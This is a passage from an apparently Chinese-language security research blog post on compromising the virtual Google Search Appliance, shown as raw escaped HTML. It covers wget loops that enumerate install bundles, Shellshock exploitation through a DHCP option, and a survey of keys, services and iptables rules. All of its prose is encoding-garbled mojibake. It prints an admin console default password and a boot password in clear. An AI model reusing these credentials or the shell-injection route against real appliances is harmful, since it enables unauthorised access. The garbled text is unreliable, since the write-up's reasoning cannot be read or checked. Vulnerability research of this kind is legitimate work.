class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;åŠ ä¸Šç¶²è·¯æœå°‹åˆ°çš„è³‡æ–™ï¼ŒæˆåŠŸå–å›ä»¥ä¸‹æª”æ¡ˆï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
all_langs-lang-pack-2.2-1.bin
centos_patch_files-6.0.0-22.bin
centos_patch_files-6.14.0-28.bin
centos_patch_files-7.0.14-238.bin
centos_patch_files-7.2.0-252.bin
centos_patch_files-7.2.0-264.bin
centos_patch_files-7.2.0-270.bin
centos_patch_files-7.2.0-280.bin
centos_patch_files-7.2.0-286.bin
install_bundle-10000653-7.2.0-252.bin
install_bundle-10000658-7.2.0-264.bin
install_bundle-10000661-7.2.0-270.bin
install_bundle-10000681-7.4.0-64.bin
install_bundle-10000685-7.4.0-72.bin
install_bundle-10000686-7.4.0-74.bin
install_bundle-10000692-7.4.0-82.bin
install_bundle-10000762-7.6.0-36.bin
install_bundle-10000767-7.6.0-42.bin
install_bundle-10000772-7.6.0-46.bin
install_bundle-10000781-7.6.0-58.bin
install_bundle-10000810-7.6.50-30.bin
install_bundle-10000822-7.6.50-36.bin
install_bundle-10000855-7.6.50-64.bin
install_bundle-10000878-7.6.250-12.bin
install_bundle-10000888-7.6.250-20.bin
install_bundle-10000901-7.6.250-26.bin
install_bundle-10000915-7.6.360-10.bin
install_bundle-10000926-7.6.360-16.bin
install_bundle-10000967-7.6.512-18.bin
sw_files-5.0.4-22.bin
sw_files-6.14.0-28.bin
sw_files-7.0.14-238.bin
vm_patch_1_for_504_G22_and_G24_only.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;

&lt;p&gt;æ¥è‘—é–‹å§‹ VGSA çš„ç ”ç©¶ï¼Œé è¨­æƒ…æ³ä¸‹å®ŒæˆåŒ¯å…¥è™›æ“¬æ©Ÿå¾Œæ­¤ç³»çµ±åªæä¾›äº†ä¸€å€‹ç¶²è·¯è¨­å®šçš„åŠŸèƒ½ï¼Œ
æ²’æœ‰æä¾› shell å¯ä¾›æ“ä½œä½¿ç”¨ã€‚ä½†æ˜¯ç”±æ–¼è™›æ“¬æ©Ÿå™¨æ˜¯åŸ·è¡Œåœ¨è‡ªå·±ç’°å¢ƒä¸Šï¼Œ
æ‰€ä»¥é€šå¸¸å¯ä»¥é€éä¸‹åˆ—æ–¹å¼å–å¾—ç³»çµ±æ¬Šé™ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç›´æ¥ä¿®æ”¹æœªåŠ å¯†çš„ç£ç¢Ÿæ©Ÿæª”æ¡ˆ&lt;/li&gt;
  &lt;li&gt;ä¿®æ”¹è™›æ“¬æ©Ÿè¨˜æ†¶é«”å…§å®¹&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨å…¶ä»–ä½œæ¥­ç³»çµ±å…‰ç¢Ÿæˆ–ç£ç¢Ÿé–‹æ©Ÿ&lt;/li&gt;
  &lt;li&gt;å…¶ä»–å·²çŸ¥æ¼æ´&lt;/li&gt;
  &lt;li&gt;å¯«æ­»çš„ç®¡ç†å“¡æˆ–ç³»çµ±å¸³è™Ÿã€å¯†ç¢¼&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸‹åœ–ç‚º vGSA ç¶²è·¯è¨­å®šç•«é¢ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;

&lt;p&gt;ç•¶æ¸¬è©¦æ—©æœŸçš„ Linux è¨­å‚™åŠæœå‹™ï¼Œå°¤å…¶æ˜¯ä½¿ç”¨ RedHat ç³»åˆ—çš„ä½œæ¥­ç³»çµ±æ™‚ï¼Œé€šå¸¸æœƒæœ‰ Shellshock çš„æ¼æ´ï¼Œ
è€Œç™¼å¸ƒæ—¥æœŸå†2008çš„ vGSA ä¹Ÿä¸ä¾‹å¤–ã€‚dhcp server ä¸­æ’å…¥ option 114 æœƒè¢«è¨­ç½®æ–¼ç’°å¢ƒè®Šæ•¸ï¼Œå¾è€Œè§¸ç™¼æ¼æ´ï¼ŒåŸ·è¡Œä»»æ„æŒ‡ä»¤ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æŒ‡ä»¤ç‚ºï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;ï¼Œå¯ä»¥å¾ä¸»æ§å°è¼¸å‡ºä¸­çœ‹åˆ°æ­¤æŒ‡ä»¤è¢«é‡è¤‡åŸ·è¡Œï¼Œä¸¦ç”¢ç”ŸéŒ¯èª¤è¨Šæ¯ã€‚&lt;/p&gt;

&lt;h4 id=&quot;vgsa-è§€å¯Ÿ&quot;&gt;vGSA è§€å¯Ÿ&lt;/h4&gt;

&lt;p&gt;æˆåŠŸå–å¾—ä½œæ¥­ç³»çµ±æ¬Šé™å¾Œï¼Œé€²è¡Œç¶²è·¯ç’°å¢ƒã€åŸ·è¡Œç¨‹å¼ã€æª”æ¡ˆç³»çµ±çš„è§€å¯Ÿï¼Œä»¥ä¸‹æ˜¯ä½œæ¥­ç³»çµ±ç’°å¢ƒè§€å¯Ÿå¿ƒå¾—ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç‰ˆæœ¬è™Ÿç‚º 5.2.0.G.27ã€‚&lt;/li&gt;
  &lt;li&gt;æœå‹™ä¸»è¦ç”± C/C++ã€javaã€python ç·¨å¯«&lt;/li&gt;
  &lt;li&gt;/export/hda3 ä¼¼ä¹æ˜¯æœå‹™ä¸»è¦ä½¿ç”¨çš„ç›®éŒ„&lt;/li&gt;
  &lt;li&gt;/etc/shadow å­˜åœ¨å¸³è™Ÿ rootã€å¯†ç¢¼é›œæ¹Šç‚º xâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆM&lt;/li&gt;
  &lt;li&gt;ç®¡ç†ä»‹é¢ 8000ã€8443 é è¨­ç®¡ç†å¯†ç¢¼ç‚º j0njlRXpU5CQ&lt;/li&gt;
  &lt;li&gt;/.gnupg å­˜åœ¨ ent_box_key å…¬ç§é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;/.gnupg å­˜åœ¨ google_license_key å…¬é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;/.ssh/authorized_keys å­˜åœ¨å…©çµ„å…¬é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;/root/.ssh/authorized_keys å­˜åœ¨ä¸€çµ„å…¬é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;/root/.ssh/ å­˜åœ¨å…©çµ„ssh å…¬ç§é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;/root/.gnupg/ å­˜åœ¨ ent_box_key å…¬ç§é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ Oracle å…¬å¸çš„ Outside In Technology å°‡æ–‡ä»¶è½‰æ›ç‚º htmlç¶²é ã€‚&lt;/li&gt;
  &lt;li&gt;java åŸ·è¡Œç’°å¢ƒä½¿ç”¨ Security Manager ä¿è­·ã€‚&lt;/li&gt;
  &lt;li&gt;è«‹æ±‚å·¥ç¨‹å¸«æ”¯æ´åŠŸèƒ½ä½¿ç”¨ ppp å»ºæ§‹è™›æ“¬ç§æœ‰ç¶²è·¯ï¼Œ /etc/ppp/chap-secrets å­˜æœ‰å¸³è™Ÿå¯†ç¢¼ ( zâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆcã€]â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆT )&lt;/li&gt;
  &lt;li&gt;/etc/lilo.confä¸­çš„é–‹æ©Ÿé¸å–®å¯†ç¢¼ç‚º cmBalx7&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric æœ‰ä¸€æŠŠç–‘ä¼¼ç‚ºå°ç¨±å¼åŠ å¯†ä½¿ç”¨çš„å¯†ç¢¼&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd å­˜åœ¨å…©çµ„å¸³å¯†çµ„åˆ ( adminï¼š Mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆw=:9â–ˆâ–ˆ=  googleï¼šwâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆo=:Nâ–ˆâ–ˆ=  )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œå…·æœ‰ç¶²è·¯æœå‹™çš„åŸ·è¡Œç¨‹å¼çš„è§€å¯Ÿå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;é€šè¨ŠåŸ &lt;/th&gt;
      &lt;th&gt;æœå‹™åç¨±&lt;/th&gt;
      &lt;th&gt;ç¨‹å¼ç·¨å¯«èªè¨€&lt;/th&gt;
      &lt;th&gt;æœå‹™èªªæ˜&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;OpenSSH Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;953&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1111&lt;/td&gt;
      &lt;td&gt;webserver_config&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Installer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2100&lt;/td&gt;
      &lt;td&gt;adminrunner.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;enterpriseconsole backend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3990&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;https å‰ç«¯&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4911&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4916&lt;/td&gt;
      &lt;td&gt;reactor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5600&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6600&lt;/td&gt;
      &lt;td&gt;cacheserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7880&lt;/td&gt;
      &lt;td&gt;TableServer&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7882&lt;/td&gt;
      &lt;td&gt;AuthzChecker&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7886&lt;/td&gt;
      &lt;td&gt;tomcat&lt;/td&gt;
      &lt;td&gt;Java&lt;/td&gt;
      &lt;td&gt;tomcat server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;redirect http to https&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8888&lt;/td&gt;
      &lt;td&gt;GWS&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9300&lt;/td&gt;
      &lt;td&gt;oneboxserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9328&lt;/td&gt;
      &lt;td&gt;entspellmixer&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9400&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9402&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9448&lt;/td&gt;
      &lt;td&gt;qrewrite&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9450&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager )&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10094&lt;/td&gt;
      &lt;td&gt;enterprise_onebox&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10200&lt;/td&gt;
      &lt;td&gt;clustering_server&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11913&lt;/td&gt;
      &lt;td&gt;sessionmanager&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12345&lt;/td&gt;
      &lt;td&gt;RegistryServer&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19780&lt;/td&gt;
      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;21200&lt;/td&gt;
      &lt;td&gt;FileSystemGateway&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31300&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;é›–ç„¶æœ‰é€™éº¼å¤šæœå‹™ï¼Œä½†æ˜¯ iptables é˜»æ“‹äº†å¤§éƒ¨åˆ†çš„é€£ç·šï¼Œä»¥ä¸‹æ˜¯ iptables è¨­å®šï¼š&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
